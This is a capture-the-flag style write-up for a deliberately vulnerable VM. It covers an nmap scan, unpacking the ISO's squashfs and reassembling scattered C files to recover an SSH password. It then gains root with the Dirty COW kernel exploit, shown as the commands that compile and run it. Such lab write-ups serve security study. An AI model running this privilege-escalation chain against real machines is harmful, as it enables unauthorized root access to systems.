# Writeup 1

## Host ip address

First we need to find the IP address of the VM

```
$ ifconfig
...
vmnet8: flags=8863<UP,BROADCAST,SMART,RUNNING,SIMPLEX,MULTICAST> mtu 1500
	ether 00:50:56:c0:00:08
	inet 192.168.80.1 netmask 0xffffff00 broadcast 192.168.80.255
...
```
Now we scan this IP with nmap

```
$ nmap 192.168.80.1-255
Starting Nmap 7.60 ( https://nmap.org ) at 2018-02-22 14:14 CET
Nmap scan report for 192.168.80.1
Host is up (0.00019s latency).
Not shown: 967 closed ports, 32 filtered ports
PORT   STATE SERVICE
22/tcp open  ssh

Nmap scan report for 192.168.80.128
Host is up (0.00053s latency).
Not shown: 994 closed ports
PORT    STATE SERVICE
21/tcp  open  ftp
22/tcp  open  ssh
80/tcp  open  http
143/tcp open  imap
443/tcp open  https
993/tcp open  imaps
```

The machine with the most ports open is the one we are looking for...  
In this example : 192.168.80.128


## ISO File System

Now we need to gain access to the file system of the ISO.
Among other files, this ISO contains the following one : "/casper/filesystem.squashfs".
This file is actually the whole compressed file system.
To decompress and extract it we can use the linux unsquashfs command like so :

```
unsquashfs -f -d /path/to/destination/ /path/to/source/filesystem.squashfs
```

## /home/lmezard/

Here we can find 2 files.

```
$ cd /home/lmezard/ ; ls
fun  README
```
The fun file is actually an archive...

```
$ file fun
fun: POSIX tar archive (GNU)
```

Decompressing it produces a new directory called "ft_fun".

```
$ tar xvf fun ; ls
ft_fun  fun  README
```

The ft_fun directory contains a fuck tone of files...  
We notice that each one of them is written in C language and its last line is tagged with a comment like so :
- //file3
- //file235
- ...

We can write a little PHP script to read them and recompose the original C file, compile the file and execute it.

```
$ php pack.php && gcc main.c && ./a.out
MY PASSWORD IS: Iheartpwnage
Now SHA-256 it and submit
```

If we SHA-256 this password we obtain
```
330b845f32185747e4f8ca15d40ca59796035c89ea809fb5d30f4da83ecf45a4
```
We can now connect with ssh as "laurie".

## Race Condition Privilege Escalation

First we need information about the OS.  

Kernel version
```
$ uname -r
3.2.0-91-generic-pae
```

Distribution name and version
```
$ cat /etc/*-release
Ubuntu, 12.04
```

With these informations and a little bit of research on [exploit-db](https://www.exploit-db.com) we found the following exploit
```
Linux Kernel 2.6.22 < 3.9 - 'Dirty COW' 'PTRACE_POKEDATA' Race Condition Privilege Escalation (/etc/passwd Method)
```

Get the [script](https://www.exploit-db.com/exploits/40839/) from exploit-db, compile it and launch it
```
$ gcc -pthread dirty.c -o dirty -lcrypt && ./dirty
```

Add a password
```
12345
```

Then use it to get root
```
su firefart
```

## Tadam

Have fun
